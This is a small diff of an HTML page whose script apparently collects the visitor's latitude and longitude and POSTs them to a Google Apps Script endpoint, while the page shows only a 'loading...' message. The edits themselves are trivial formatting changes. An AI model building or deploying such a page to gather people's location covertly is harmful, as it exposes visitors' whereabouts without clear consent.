@@ -30,7 +30,6 @@
             latitude: latitude,
             longitude: longitude
           };
-
           fetch('https://script.google.com/macros/s/AKfycbx-hm3O8zHhehqbgk5GmKCp4RRX7uJrlafsIV7A2i_ZzuGG29IfSkPIbAk3mz8GAfoAjA/exec', {
             method: 'POST',
             headers: {
@@ -51,6 +50,6 @@
     </script>
   </head>
   <body>
-    <div id="status">Loading...</div>
+    <div id="status">loading...</div>
   </body>
 </html>
